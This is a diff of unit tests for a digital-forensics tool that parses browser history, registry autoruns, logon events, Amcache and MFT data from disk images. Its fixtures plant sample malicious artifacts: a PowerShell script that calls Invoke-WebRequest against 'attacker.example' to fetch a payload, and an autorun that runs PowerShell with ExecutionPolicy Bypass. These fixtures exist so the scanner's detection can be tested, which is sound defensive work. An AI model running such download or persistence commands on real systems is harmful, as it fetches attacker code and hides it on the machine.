@@ -4,6 +4,7 @@ from pathlib import Path
 from tempfile import TemporaryDirectory
 import importlib.util
 import json
+import sqlite3
 import subprocess
 import unittest
 from unittest.mock import patch
@@ -156,7 +157,9 @@ class AnalysisTests(unittest.TestCase):
         )
         runner = RemoteSIFTRunner(request)
         command = runner._build_command("timeline_mft")
-        self.assertEqual(command[:4], ["ssh", "-p", "22", "sift@dfir.example"])
+        self.assertEqual(command[:3], ["ssh", "-p", "22"])
+        self.assertIn("BatchMode=yes", command)
+        self.assertIn("sift@dfir.example", command)
         self.assertIn("/home/sift/findevil/scripts/sift_tool_bridge.py", command)
         self.assertIn("/cases/case1/image.E01", command)
 
@@ -220,6 +223,26 @@ class AnalysisTests(unittest.TestCase):
         self.assertTrue(result.payload["errors"])
         self.assertIn("Replace the placeholder", result.payload["errors"][0])
 
+    def test_remote_runner_returns_json_failure_on_timeout(self) -> None:
+        request = CaseRequest(
+            case_path=str(SAMPLE_CASE),
+            disk_path=str(SAMPLE_CASE / "image.E01"),
+            output_path="runs/unused",
+            tool_backend="sift-ssh",
+            remote_host="127.0.0.1",
+            remote_user="sift",
+            remote_workdir="/home/sift/findevil",
+            remote_timeout_sec=3,
+        )
+        runner = RemoteSIFTRunner(request)
+        timeout = subprocess.TimeoutExpired(cmd=["ssh"], timeout=3)
+
+        with patch.object(remote_module.subprocess, "run", side_effect=timeout):
+            result = runner.run_self_test()
+
+        self.assertEqual(result.exit_code, 124)
+        self.assertIn("timed out", result.payload["errors"][0])
+
     def test_bridge_directory_mode_extracts_prefetch(self) -> None:
         with TemporaryDirectory() as temp_dir:
             root = Path(temp_dir)
@@ -268,6 +291,47 @@ class AnalysisTests(unittest.TestCase):
             self.assertEqual(payload["records"][0]["task_name"], "AdobeUpdaterCheck")
             self.assertEqual(payload["records"][0]["command"], "powershell.exe")
 
+    def test_bridge_directory_mode_extracts_browser_history(self) -> None:
+        with TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            history = root / "Users" / "Analyst" / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History"
+            history.parent.mkdir(parents=True)
+            connection = sqlite3.connect(history)
+            connection.execute("CREATE TABLE urls (url TEXT, title TEXT, visit_count INTEGER, last_visit_time INTEGER)")
+            connection.execute(
+                "INSERT INTO urls VALUES (?, ?, ?, ?)",
+                ("https://cdn-delivery.example/invoice_update.zip", "invoice", 1, 123),
+            )
+            connection.commit()
+            connection.close()
+
+            completed = subprocess.run(
+                ["python3", str(BRIDGE), "--tool", "browser_history", "--disk", str(root)],
+                capture_output=True,
+                text=True,
+                check=False,
+            )
+            payload = json.loads(completed.stdout)
+            self.assertEqual(completed.returncode, 0)
+            self.assertEqual(payload["records"][0]["url"], "https://cdn-delivery.example/invoice_update.zip")
+
+    def test_bridge_directory_mode_scans_suspicious_file_content(self) -> None:
+        with TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            script = root / "Users" / "Analyst" / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Themes" / "update.ps1"
+            script.parent.mkdir(parents=True)
+            script.write_text("powershell Invoke-WebRequest http://attacker.example/payload", encoding="utf-8")
+
+            completed = subprocess.run(
+                ["python3", str(BRIDGE), "--tool", "yara_scan", "--disk", str(root)],
+                capture_output=True,
+                text=True,
+                check=False,
+            )
+            payload = json.loads(completed.stdout)
+            self.assertEqual(completed.returncode, 0)
+            self.assertEqual(payload["records"][0]["rule"], "Inline_Suspicious_Windows_Artifact")
+
     def test_bridge_parser_extracts_registry_autorun_records(self) -> None:
         sample = """
 Software\\Microsoft\\Windows\\CurrentVersion\\Run
@@ -277,6 +341,62 @@ Value : powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Analyst\\AppData
         records = BRIDGE_MODULE.parse_regripper_output(sample, "NTUSER.DAT", "run")
         self.assertEqual(records[0]["entry"], "ThemeUpdater")
         self.assertIn("powershell.exe", records[0]["value"])
+
+    def test_bridge_parser_extracts_security_logons(self) -> None:
+        sample = """
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System><EventID>4624</EventID></System>
+  <EventData>
+    <Data Name="TargetUserName">Analyst</Data>
+    <Data Name="LogonType">2</Data>
+    <Data Name="IpAddress">127.0.0.1</Data>
+  </EventData>
+</Event>
+"""
+        records = BRIDGE_MODULE.parse_security_events_xml(sample, "Security.evtx")
+        self.assertEqual(records[0]["user"], "Analyst")
+        self.assertEqual(records[0]["event_id"], "4624")
+
+    def test_bridge_parser_extracts_amcache_records(self) -> None:
+        sample = """
+Name: powershell.exe
+Path: C:\\Users\\Analyst\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\update.ps1
+SHA1: deadbeef
+"""
+        records = BRIDGE_MODULE.parse_amcache_output(sample, "Amcache.hve")
+        self.assertEqual(records[0]["program_name"], "powershell.exe")
+        self.assertIn("update.ps1", records[0]["path"])
+
+    def test_bridge_detects_ntfs_partition_offset(self) -> None:
+        completed = subprocess.CompletedProcess(
+            args=["mmls"],
+            returncode=0,
+            stdout="""
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000002047   0000002048   Unallocated
+002:  000:000   0000002048   0001023999   0001021952   NTFS / exFAT (0x07)
+""",
+            stderr="",
+        )
+        with patch.object(BRIDGE_MODULE, "run_command", return_value=completed):
+            offset = BRIDGE_MODULE.detect_filesystem_offset(Path("disk.E01"))
+        self.assertEqual(offset, "0000002048")
+
+    def test_bridge_extracts_mft_from_image_before_analyzemft(self) -> None:
+        entries = [{"path": "$MFT", "address": "0", "local_path": None, "offset": "2048"}]
+        expected = [{"path": "C:\\Users\\Analyst\\Downloads\\invoice_update.zip", "action": "observed"}]
+        with patch.object(BRIDGE_MODULE, "read_entry_bytes", return_value=b"mft-bytes") as read_entry:
+            with patch.object(BRIDGE_MODULE, "timeline_from_analyzemft", return_value=expected) as analyze:
+                records = BRIDGE_MODULE.timeline_from_entries(Path("disk.E01"), entries)
+
+        self.assertEqual(records, expected)
+        read_entry.assert_called_once()
+        self.assertTrue(analyze.call_args.args[0].name == "$MFT")
 
     def test_bridge_self_test_reports_supported_tools(self) -> None:
         completed = subprocess.run(
@@ -317,6 +437,7 @@ Value : powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Analyst\\AppData
             ROOT / "scripts" / "install_sift_in_guest.sh",
             ROOT / "scripts" / "install_sift_guest_payload.sh",
             ROOT / "scripts" / "rebuild_utm_sift_vm.sh",
+            ROOT / "scripts" / "image_and_analyze.sh",
         ):
             completed = subprocess.run(
                 ["bash", "-n", str(script)],
